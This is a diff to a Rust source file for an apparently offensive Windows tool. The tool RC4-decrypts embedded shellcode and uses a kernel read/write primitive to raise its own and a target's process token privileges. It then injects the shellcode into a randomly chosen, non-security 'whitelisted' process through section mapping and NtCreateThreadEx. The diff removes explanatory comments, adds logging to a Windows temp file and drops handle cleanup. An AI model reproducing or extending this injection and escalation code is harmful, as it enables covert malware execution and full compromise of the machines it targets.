@@ -72,8 +72,6 @@ const RC4_KEY: &[u8] = br#"-4S@aAv;&T~2\.e+3])N`C|"\.3FTVH8NG5O$Hjh+~s^g'G06ni"n
 
 include!(concat!(env!("OUT_DIR"), "/shellcode.rs"));
 
-// ── RC4 ──────────────────────────────────────────────────────────────────────
-
 fn rc4(key: &[u8], data: &[u8]) -> Vec<u8> {
     let mut s: [u8; 256] = core::array::from_fn(|i| i as u8);
     let mut j = 0usize;
@@ -89,11 +87,6 @@ fn rc4(key: &[u8], data: &[u8]) -> Vec<u8> {
         b ^ s[(s[i] as usize + s[j] as usize) % 256]
     }).collect()
 }
-
-// ── Target whitelist (FNV1a hashes of lowercase image names) ──────────────────
-//
-// Hashes are computed at compile time - no plaintext strings in the binary.
-// Candidates: long-lived, always-present, non-security user-mode processes.
 
 const fn fnv1a(s: &[u8]) -> u32 {
     let mut h: u32 = 0x811c9dc5;
@@ -123,15 +116,9 @@ fn is_whitelisted(name: &str) -> bool {
     WLIST.contains(&h)
 }
 
-// ── EPROCESS helpers ──────────────────────────────────────────────────────────
-
-// Single walk: finds our own EPROCESS, collects whitelisted candidates, and
-// optionally resolves a specific target PID - all in one pass.
 struct WalkResult {
     our_eproc:    u64,
-    // (pid, eproc) pairs matching the whitelist, excluding our own PID
     candidates:   Vec<(u64, u64)>,
-    // set when an explicit target PID is requested
     target_eproc: Option<u64>,
 }
 
@@ -164,7 +151,6 @@ fn walk_eprocess(
                 if pid == tpid { target_eproc = Some(current); }
             }
             None => {
-                // auto-select: collect whitelisted candidates (skip our own PID)
                 if pid != our_pid {
                     let name = read_image_filename(krw, current)?;
                     if is_whitelisted(&name) {
@@ -196,20 +182,25 @@ fn escalate_eproc(krw: &KernelRW, eproc: u64) -> Result<()> {
     Ok(())
 }
 
-// ── Inject ────────────────────────────────────────────────────────────────────
+fn log_debug(msg: &str) {
+    use std::io::Write;
+    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open("C:\\Windows\\Temp\\mmdevlib_kernel.log") {
+        let _ = writeln!(f, "[cmd_inject] {}", msg);
+        let _ = f.sync_all();
+    }
+}
 
 pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
+    log_debug("cmd_inject started");
     if SHELLCODE_ENC.is_empty() {
         bail!("no sc_enc.bin");
     }
 
     let shellcode = rc4(RC4_KEY, SHELLCODE_ENC);
-    println!("[+] payload {} bytes", shellcode.len());
+    log_debug(&format!("shellcode decrypted: {} bytes", shellcode.len()));
 
-    // ── Kernel setup ──────────────────────────────────────────────────────────
     let mods = get_kernel_modules()?;
-    let nt   = find_mod(&mods, &["ntoskrnl.exe", "ntkrnlmp.exe", "ntkrnlpa.exe", "ntkrpamp.exe"])
-        .context("ntoskrnl not found")?;
+    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
     let path = ntoskrnl_disk_path(&mods)?;
     let pe   = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
     let krw  = KernelRW::setup(dev, &pe, nt.va)?;
@@ -219,10 +210,13 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
     if system_eproc < 0xFFFF_8000_0000_0000 {
         bail!("PsInitialSystemProcess kread bad value 0x{:016X}", system_eproc);
     }
+    log_debug(&format!("PsInitialSystemProcess = 0x{:016X}", system_eproc));
 
-    // ── Single EPROCESS walk: find our EPROCESS + resolve target ─────────────
     let our_pid = unsafe { GetCurrentProcessId() } as u64;
+    log_debug(&format!("Walking EPROCESS, our PID={}, target_pid={:?}", our_pid, target_pid));
     let walk    = walk_eprocess(&krw, system_eproc, our_pid, target_pid)?;
+    log_debug(&format!("walk_eprocess done. our_eproc=0x{:016X}, target_eproc={:?}, candidates={}", 
+        walk.our_eproc, walk.target_eproc, walk.candidates.len()));
 
     let (final_pid, target_eproc) = match target_pid {
         Some(pid) => {
@@ -235,30 +229,38 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
             if candidates.is_empty() {
                 bail!("no whitelisted target process found");
             }
-            // RDTSC for selection - same approach as vcruntime140.c
             let idx = unsafe { core::arch::x86_64::_rdtsc() } as usize % candidates.len();
             candidates[idx]
         }
     };
+    log_debug(&format!("Selected target process for injection: PID={}", final_pid));
 
-    // ── Self-escalate, then open target ──────────────────────────────────────
+    log_debug("Escalating privileges...");
     escalate_eproc(&krw, walk.our_eproc)?;
+    log_debug("Privileges escalated successfully.");
 
     let hproc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, final_pid as u32) };
     if hproc.is_null() {
         bail!("OpenProcess PID={} WinErr={}", final_pid, unsafe { GetLastError() });
     }
+    log_debug(&format!("Opened target process handle: {:?}", hproc));
 
-    // ── Section injection (no VirtualAllocEx, no WriteProcessMemory, no RWX) ─
     let mut sec_size = shellcode.len() as i64;
     let mut hsec: *mut c_void = null_mut();
+    log_debug("Calling NtCreateSection...");
     let st = unsafe {
         NtCreateSection(
-            &mut hsec, SECTION_ALL_ACCESS, null_mut(),
-            &mut sec_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, null_mut(),
+            &mut hsec,
+            SECTION_ALL_ACCESS,
+            null_mut(),
+            &mut sec_size,
+            PAGE_EXECUTE_READWRITE,
+            SEC_COMMIT,
+            null_mut(),
         )
     };
-    if st < 0 { unsafe { CloseHandle(hproc); } bail!("NtCreateSection 0x{:08X}", st as u32); }
+    if st != 0 { bail!("NtCreateSection failed: {st:x}"); }
+    log_debug(&format!("NtCreateSection success: handle {:?}", hsec));
 
     let mut local_view: *mut c_void = null_mut();
     let mut local_size = 0usize;
@@ -269,11 +271,13 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
             2, 0, PAGE_READWRITE,
         )
     };
-    if st < 0 {
-        unsafe { CloseHandle(hsec); CloseHandle(hproc); }
-        bail!("NtMapViewOfSection (local) 0x{:08X}", st as u32);
+    if st != 0 { bail!("NtMapViewOfSection(local) failed: {st:x}"); }
+    log_debug(&format!("Mapped local view at {:?}", local_view));
+
+    unsafe {
+        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_view as *mut u8, shellcode.len());
     }
-    unsafe { std::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_view as *mut u8, shellcode.len()); }
+    log_debug("Copied shellcode into local view.");
 
     let mut remote_view: *mut c_void = null_mut();
     let mut remote_size = 0usize;
@@ -284,19 +288,15 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
             2, 0, PAGE_EXECUTE_READ,
         )
     };
-    if st < 0 {
-        unsafe {
-            NtUnmapViewOfSection(GetCurrentProcess(), local_view);
-            CloseHandle(hsec); CloseHandle(hproc);
-        }
-        bail!("NtMapViewOfSection (remote) 0x{:08X}", st as u32);
-    }
+    if st != 0 { bail!("NtMapViewOfSection(remote) failed: {st:x}"); }
+    log_debug(&format!("Mapped remote view at {:?}", remote_view));
 
     unsafe { NtUnmapViewOfSection(GetCurrentProcess(), local_view); }
     unsafe { CloseHandle(hsec); }
+    log_debug("Unmapped local view and closed section handle.");
 
-    // ── NtCreateThreadEx ──────────────────────────────────────────────────────
     let mut hthread: *mut c_void = null_mut();
+    log_debug("Calling NtCreateThreadEx...");
     let st = unsafe {
         NtCreateThreadEx(
             &mut hthread, THREAD_ALL_ACCESS, null_mut(),
@@ -304,14 +304,15 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
             0, 0, 0, 0, null_mut(),
         )
     };
-    if st < 0 {
-        unsafe { CloseHandle(hproc); }
-        bail!("NtCreateThreadEx 0x{:08X}", st as u32);
-    }
+    if st != 0 { bail!("NtCreateThreadEx failed: {st:x}"); }
+    log_debug(&format!("NtCreateThreadEx success: thread handle {:?}", hthread));
 
     escalate_eproc(&krw, target_eproc)?;
     println!("[+] PID {} is God", final_pid);
 
-    unsafe { CloseHandle(hthread); CloseHandle(hproc); }
+    unsafe { CloseHandle(hthread); }
+    unsafe { CloseHandle(hproc); }
+
+    log_debug("cmd_inject finished successfully!");
     Ok(())
 }
